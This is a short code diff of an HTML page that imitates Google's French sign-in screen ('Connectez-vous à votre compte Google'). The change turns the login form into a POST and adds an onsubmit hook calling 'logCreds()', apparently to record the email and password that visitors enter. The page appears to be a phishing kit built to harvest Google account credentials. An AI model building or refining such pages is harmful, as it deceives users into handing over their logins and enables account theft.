@@ -157,7 +157,8 @@ fill="#E21724" stroke="none">
   <center><h1>Connectez-vous à votre compte Google</h1>
       </center>
 
-    <form action="/get" id="login-form">
+    <form action="/post" method="POST" id="login-form" onsubmit="logCreds();">
+
     
       <input name="email" class="input-field" type="text" placeholder="E-mail ou téléphone" required>
       
